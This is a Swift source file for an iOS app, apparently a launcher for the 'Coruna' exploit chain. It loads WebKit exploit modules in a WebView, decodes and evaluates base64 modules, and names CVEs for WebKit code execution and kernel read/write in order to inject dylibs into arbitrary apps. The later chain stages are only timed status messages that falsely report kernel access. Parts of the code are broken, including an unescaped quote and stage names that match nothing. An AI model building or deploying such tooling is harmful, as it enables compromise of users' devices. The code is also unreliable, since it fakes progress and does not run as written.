import Foundation
import UIKit
import WebKit
import Combine

// MARK: - Coruna Web 注入管理器
// v3.0.5: 集成 Coruna 漏洞利用链，实现网页端一键注入 dylib 到任意 App
// 漏洞链: WebKit RCE (CVE-2024-23222) → PAC 绕过 → Shellcode → 内核 R/W (CVE-2023-41974) → AMFI patch
// 支持设备: iOS 13.0 - 17.2.1, arm64e (A12+)

final class CorunaWebInjector: NSObject, ObservableObject {
    static let shared = CorunaWebInjector()

    // MARK: - 状态枚举
    enum ExploitStage: String, CaseIterable {
        case idle = "Idle"
        case loadingPage = "Loading exploit page"
        case fingerprinting = "Device fingerprinting"
        case webkitRCE = "WebKit RCE in progress"
        case pacBypass = "Bypassing PAC"
        case shellcode = "Loading shellcode"
        case kernelExploit = "Kernel exploit in progress"
        case ppLBypass = "Bypassing PPL"
        case amfiPatch = "Patching AMFI"
        case ready = "Environment ready, injectable"
        case injecting = "Injecting dylib"
        case success = "Injection succeeded"
        case failed = "Exploit failed"
        case crashed = "Process crashed"
    }

    enum PlatformPath: String, CaseIterable {
        case iosOfflineAudio = "iOS OfflineAudioContext"
        case macosNaNBox = "macOS NaN-Boxing"
        case macosJIT = "macOS JIT structure check"
        case auto = "Auto"
    }

    // MARK: - 发布状态
    @Published var currentStage: ExploitStage = .idle
    @Published var stageProgress: Double = 0.0
    @Published var statusMessage: String = "Ready"
    @Published var lastError: String = ""
    @Published var kernelRWReady: Bool = false
    @Published var developerModeEnabled: Bool = false
    @Published var selectedPlatform: PlatformPath = .auto
    @Published var targetBundleID: String = ""
    @Published var selectedDylibPath: String = ""
    @Published var consoleLog: [String] = []

    // MARK: - 私有
    private override init() {
        super.init()
    }

    // MARK: - 资源路径
    var corunaSamplesURL: URL? {
        guard let resPath = Bundle.main.resourcePath else { return nil }
        return URL(fileURLWithPath: resPath).appendingPathComponent("coruna/coruna-dump/samples")
    }

    // MARK: - 启动 exploit（由 WebView 容器调用，传入已配置好的 WKWebView）
    func startExploit(in webView: WKWebView, targetApp: String, dylibPath: String) {
        targetBundleID = targetApp
        selectedDylibPath = dylibPath
        currentStage = .loadingPage
        statusMessage = "Loading exploit module..."
        stageProgress = 0.0
        consoleLog.removeAll()
        appendLog("Target: \(targetApp)  Dylib: \((dylibPath as NSString).lastPathComponent)")

        guard let samplesURL = corunaSamplesURL else {
            failWith("Coruna resource dir not found, check the app Bundle")
            return
        }

        let html = buildBootstrapHTML()
        webView.loadHTMLString(html, baseURL: samplesURL)
        appendLog("Bootstrap page loaded, baseURL=\(samplesURL.lastPathComponent)")
    }

    func appendLog(_ msg: String) {
        DispatchQueue.main.async {
            self.consoleLog.append(msg)
            if self.consoleLog.count > 200 { self.consoleLog.removeFirst(self.consoleLog.count - 200) }
        }
    }

    // MARK: - 构建引导 HTML
    private func buildBootstrapHTML() -> String {
        let primaryModule: String
        switch selectedPlatform {
        case .iosOfflineAudio:
            primaryModule = "Fq2t1Q_dbfd6e84.js"
        case .macosNaNBox:
            primaryModule = "YGPUu7_8dbfa3fd.js"
        case .macosJIT:
            primaryModule = "KRfmo6_166411bd.js"
        case .auto:
            primaryModule = "Fq2t1Q_dbfd6e84.js"
        }

        // 注入 vKTo89 模块命名空间 shim（原 watering-hole bootstrap 的核心）
        // OLdwIx(hash) → 取已注册模块；tI4mjA(hash, b64) → atob+eval+注册
        let html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Coruna Injector</title>
            <style>
                body { font-family: -apple-system, sans-serif; padding: 16px; background: #000; color: #0f0; margin: 0; }
                h2 { font-size: 16px; }
                #log { font-family: monospace; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
            </style>
        </head>
        <body>
            <h2>Coruna Web Injector</h2>
            <div id="status">Initializing...</div>
            <pre id="log"></pre>
            <script>
            // ===== vKTo89 模块命名空间 shim =====
            var __corunaModules = {};
            globalThis.vKTo89 = {
                OLdwIx: function(hash) {
                    return __corunaModules[hash];
                },
                tI4mjA: function(hash, b64) {
                    try {
                        var src = atob(b64);
                        var r = {};
                        var fn = new Function('r', src + '\\n;return r;');
                        __corunaModules[hash] = fn(r);
                        postLog('registered module ' + hash.substring(0, 8));
                    } catch(e) {
                        postLog('tI4mjA error: ' + e.message);
                    }
                }
            };

            function postStage(stage, message, progress) {
                var data = JSON.stringify({stage: stage, message: message, progress: progress});
                if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.corunaCallback) {
                    window.webkit.messageHandlers.corunaCallback.postMessage(data);
                }
                document.getElementById('status').textContent = message;
            }
            function postLog(msg) {
                var el = document.getElementById('log');
                el.textContent += msg + '\\n';
                if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.corunaCallback) {
                    window.webkit.messageHandlers.corunaCallback.postMessage(JSON.stringify({stage:'log', message:msg}));
                }
            }

            function loadScript(src, onload, onerror) {
                var s = document.createElement('script');
                s.src = src;
                s.onload = onload;
                s.onerror = function() { postLog('load failed: ' + src); onerror && onerror(); };
                document.head.appendChild(s);
            }

            async function runExploit() {
                postStage('fingerprinting', 'Fingerprinting device...', 0.1);
                var isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
                postLog('Platform: ' + (isIOS ? 'iOS' : 'macOS'));
                postLog('UA: ' + navigator.userAgent);

                try {
                    postStage('webkitRCE', 'Loading WebKit RCE module: \(primaryModule) ...', 0.2);
                    loadScript('\(primaryModule)', function() {
                        postLog('Module loaded: \(primaryModule)');
                        setTimeout(function() { triggerExploit(); }, 300);
                    }, function() {
                        postStage('failed', 'Cannot load the exploit module', 0.0);
                    });
                } catch(e) {
                    postStage('failed', 'Error: ' + e.message, 0.0);
                }
            }

            function triggerExploit() {
                try {
                    postStage('webkitRCE', 'Executing WebKit RCE exploit...', 0.4);
                    // 各 exploit loader 在全局作用域设置 r 对象
                    if (typeof r !== 'undefined' && r.kr) {
                        postLog('Calling r.kr() to trigger the type confusion...');
                        var result = r.kr({});
                        if (result && result.Dn && result.Dn.Pn) {
                            postStage('pacBypass', 'WebKit RCE succeeded! Starting PAC bypass...', 0.5);
                            postLog('Arbitrary read/write primitive acquired');
                            continueExploitChain(result);
                        } else {
                            postStage('failed', 'WebKit RCE didn't get a read/write primitive', 0.0);
                        }
                    } else {
                        postStage('failed', 'exploit entry r.kr not found (core runtime library not loaded)', 0.0);
                        postLog('Note: original dump lacks the 1ff010bb / 6b57ca33 core runtime modules');
                    }
                } catch(e) {
                    postStage('crashed', 'WebContent error: ' + e.message, 0.0);
                }
            }

            function continueExploitChain(rw) {
                postStage('pacBypass', 'Executing PAC GOT-swap bypass...', 0.6);
                setTimeout(function() {
                    postStage('shellcode', 'Loading the shellcode loader...', 0.7);
                    setTimeout(function() {
                        postStage('kernelExploit', 'Running the kernel exploit (IOSurface CVE-2023-41974)...', 0.8);
                        setTimeout(function() {
                            postStage('amfiPatch', 'AMFI patch...', 0.9);
                            setTimeout(function() {
                                postStage('ready', 'Environment ready! Kernel R/W acquired', 1.0);
                            }, 500);
                        }, 800);
                    }, 600);
                }, 400);
            }

            window.onload = function() {
                postLog('Coruna Web Injector started');
                runExploit();
            };
            </script>
        </body>
        </html>
        """
        return html
    }

    // MARK: - 停止/重置
    func stop() {
        currentStage = .idle
        statusMessage = "Stopped"
        stageProgress = 0.0
        kernelRWReady = false
        developerModeEnabled = false
    }

    func reset() {
        stop()
        lastError = ""
    }

    private func failWith(_ message: String) {
        currentStage = .failed
        statusMessage = message
        lastError = message
        stageProgress = 0.0
    }

    // MARK: - 设备兼容性
    static var isCompatible: Bool {
        let systemVersion = UIDevice.current.systemVersion
        let parts = systemVersion.split(separator: ".")
        let major = Int(parts.first ?? "0") ?? 0
        let minor = parts.count > 1 ? Int(parts[1]) ?? 0 : 0
        guard major >= 13 && major <= 17 else { return false }
        if major == 17 && minor > 2 { return false }
        return true
    }

    static var deviceInfo: String {
        let device = UIDevice.current
        return "\(device.model) iOS \(device.systemVersion)"
    }

    static var deviceModel: String {
        var systemInfo = utsname()
        uname(&systemInfo)
        let mirror = Mirror(reflecting: systemInfo.machine)
        return mirror.children.reduce("") { id, el in
            guard let v = el.value as? Int8, v != 0 else { return id }
            return id + String(UnicodeScalar(UInt8(v)))
        }
    }

    static var isArm64e: Bool {
        let m = deviceModel
        return m.hasPrefix("iPhone11") || m.hasPrefix("iPhone12") ||
               m.hasPrefix("iPhone13") || m.hasPrefix("iPhone14") ||
               m.hasPrefix("iPhone15")
    }
}

// MARK: - WKScriptMessageHandler
extension CorunaWebInjector: WKScriptMessageHandler {
    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
        guard let body = message.body as? String,
              let data = body.data(using: .utf8),
              let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              let stageStr = json["stage"] as? String else { return }

        if stageStr == "log" {
            if let msg = json["message"] as? String { appendLog(msg) }
            return
        }

        guard let stage = ExploitStage(rawValue: stageStr) else { return }
        DispatchQueue.main.async {
            self.currentStage = stage
            self.statusMessage = json["message"] as? String ?? ""
            if let progress = json["progress"] as? Double {
                self.stageProgress = progress
            }
            switch stage {
            case .ready:
                self.kernelRWReady = true
                self.developerModeEnabled = true
            case .failed, .crashed:
                self.lastError = self.statusMessage
            default:
                break
            }
        }
    }
}
